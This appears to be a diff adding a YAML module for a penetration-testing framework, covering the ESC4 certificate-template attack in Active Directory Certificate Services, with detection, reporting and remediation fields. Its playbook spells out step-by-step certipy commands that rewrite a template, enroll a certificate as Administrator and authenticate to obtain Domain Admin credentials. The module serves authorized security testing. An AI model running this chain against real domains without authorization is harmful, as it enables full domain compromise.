@@ -1,0 +1,62 @@
+# ESC4 — ADCS template ACL modifiable → grant self ESC1 → domain compromise
+#
+# A certificate template's ACL grants Write / WriteDacl /
+# WriteOwner to a compromised principal. The attacker modifies
+# the template to grant themselves ESC1 (add client-auth EKU,
+# enable ENROLLEE_SUPPLIES_SUBJECT, grant enrollment ACL to
+# their user) → enroll → PKINIT as any principal.
+#
+# Detection: `certipy find -vulnerable` flags "ESC4".
+# Fix: restrict template DACLs to the specific admin groups
+# that need modification rights.
+technique: T1649
+name: ESC4 — ADCS template ACL modifiable → self-elevate to ESC1
+tactic: [privilege-escalation, defense-evasion]
+platform: [windows]
+key: 'adcs:esc4'
+family: adcs
+ranking:
+  exploitability: high
+  safety: config-change
+  detection: moderate
+detect:
+  version_range:
+    services.adcs: ">=1.0"
+execute:
+  command: |-
+    certipy find -vulnerable -u '<user>@<domain>' -p '<pass>' -dc-ip <dc> 2>&1 | grep -A 5 ESC4 || echo "no ADCS template flagged ESC4 — see playbook"
+verify:
+  success: "ESC4"
+cleanup:
+  command: ""
+report:
+  vector_type: cert_template_esc4
+  evidence: "template {{template}} ACL grants Write to {{principal}}"
+  description: >
+    An ADCS template's DACL grants Write / WriteDacl /
+    WriteOwner to a compromised principal. The attacker flips
+    the template config to grant themselves ESC1, enrolls a
+    cert claiming any principal, PKINITs, and lands a DA TGT.
+    Distinct from ESC1 (which is a pre-existing misconfig on
+    the template) — ESC4 CREATES the misconfig via the ACL.
+  remediation: >
+    Restrict template DACLs to the specific admin group(s)
+    that need modification rights. Audit template
+    configurations for the ESC1 shape (ENROLLEE_SUPPLIES_
+    SUBJECT + client-auth EKU + broad enroll ACL); a template
+    modified via ESC4 will have this shape post-attack.
+    Revert to a known-good template config; revoke any certs
+    enrolled during the ESC1-shape window.
+  refs: [T1649, ESC4, certipy]
+playbook:
+  summary: >
+    Write template ACL → flip to ESC1 → ESC1 exploit → DA.
+  place: 'attacker-side (certipy template + certipy req)'
+  steps:
+    - "confirm: `certipy find -vulnerable -u '<user>@<domain>' -p '<pass>' -dc-ip <dc>` — look for ESC4 flagged templates + which principal has Write"
+    - "save current template config: `certipy template -template '<template>' -save-old` — writes template.json for rollback"
+    - "flip to ESC1: `certipy template -u '<user>@<domain>' -p '<pass>' -template '<template>'` — the default certipy template flip enables ENROLLEE_SUPPLIES_SUBJECT + client-auth EKU + broad enroll"
+    - "enroll as Administrator: `certipy req -u '<user>@<domain>' -p '<pass>' -ca '<CA>' -template '<template>' -upn 'Administrator@corp.local'`"
+    - "PKINIT: `certipy auth -pfx administrator.pfx -dc-ip <dc>` — DA TGT"
+    - "CLEANUP: revert the template config → `certipy template -template '<template>' -configuration template.json` + revoke the enrolled cert"
+  restore: "certipy template -template '<template>' -configuration template.json  # restore saved config"
